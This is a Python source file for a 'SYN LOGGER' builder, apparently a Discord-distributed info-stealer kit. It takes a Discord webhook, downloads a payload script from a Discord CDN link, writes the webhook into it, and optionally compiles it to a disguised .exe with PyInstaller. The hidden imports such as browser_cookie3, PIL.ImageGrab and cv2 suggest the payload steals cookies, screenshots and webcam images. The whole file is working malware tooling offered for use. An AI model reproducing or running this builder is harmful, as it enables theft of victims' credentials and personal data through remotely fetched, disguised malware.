import os, time, json, re, sys
import requests
from pystyle import *
import os
import time
import shutil

os.system(f'cls & title SYN LOGGER / discord.gg/G7xshauqqp')
SYN = """

███████╗██╗   ██╗███╗   ██╗
██╔════╝╚██╗ ██╔╝████╗  ██║
███████╗ ╚████╔╝ ██╔██╗ ██║
╚════██║  ╚██╔╝  ██║╚██╗██║
███████║   ██║   ██║ ╚████║
╚══════╝   ╚═╝   ╚═╝  ╚═══╝ 

⌜――――――――――――――――――――――――――――――――――――――――――――――――――――⌝
┇      [Discord] discord.gg/gX3KqbXB                 ┇
┇      [DEV]  Termed$#0004                           ┇
┇      [Info] Last updated 10/22/2022                ┇
⌞――――――――――――――――――――――――――――――――――――――――――――――――――――⌟

> Press Enter...
"""
SYN2 = """


██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

> Press Enter...                                                                                                                                                                    
     
"""
System.Size(120,30)
Anime.Fade(Center.Center(SYN), Colors.purple_to_blue, Colorate.Vertical, interval=0.020, enter=True)
Anime.Fade(Center.Center(SYN2), Colors.purple_to_blue, Colorate.Vertical, interval=0.020, enter=True)
Welcome = """

⌜――――――――――――――――――――――――――――――――――――――――――――――――――――⌝
┇      [Help] How to get discord webhook?             ┇
┇      https://www.youtube.com/watch?v=fKksxz2Gdnc    ┇
┇      THANKS FOR USING SYN LOGGER!                   ┇
⌞――――――――――――――――――――――――――――――――――――――――――――――――――――⌟

"""
Write.Print(Center.XCenter(Welcome), Colors.purple_to_blue, interval=0)
webhooklol = Write.Input("\nEnter webhook URL: ", Colors.purple_to_blue, interval=0.01)
r = requests.get(webhooklol)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.purple_to_blue, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print(f"Webhook Is Not Working\n",Colors.purple_to_blue, interval=0.01) 
    time.sleep(3) 
    exit()

time.sleep(3)
name = Write.Input("Enter File Name: ", Colors.purple_to_blue, interval=0.01)
code = requests.get("https://cdn.discordapp.com/attachments/1030142788622372964/1033345319494225920/logger2.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
        f.write(code.text.replace("webhookez", webhooklol))
Write.Print("SYN LOGGER Was SucessFully Built\n",Colors.purple_to_blue, interval=0.01)

compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.purple_to_blue, interval=0.01)

if compile == "y":
    Write.Print("Example of icon is OrionGrabber.ico\n",Colors.purple_to_blue, interval=0.01) 
    icon = Write.Input("Input icon name ┇ Only if u want!: ", Colors.purple_to_blue, interval=0.01)
    Write.Input(f"Ur Icon File is {icon} Also Click Enter to continue: \n",Colors.purple_to_blue, interval=0.01)
    os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil"  --hidden-import="cv2" --hidden-import="psutil"  --hidden-import="win32api" --icon={icon} {name}.py')
    os.remove(f'{name}.spec')
    Write.Print("SYN LOGGER Was SucessFully Complied In Dist Folder\n",Colors.purple_to_blue, interval=0.01) 
    time.sleep(2)
    Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using SYN LOGGER\n",Colors.purple_to_blue, interval=0.01) 
    time.sleep(3)
    exit()
elif compile == "n":
      Write.Print("Thank You For Using SYN LOGGER\n",Colors.purple_to_blue, interval=0.01) 
      time.sleep(3)
      exit()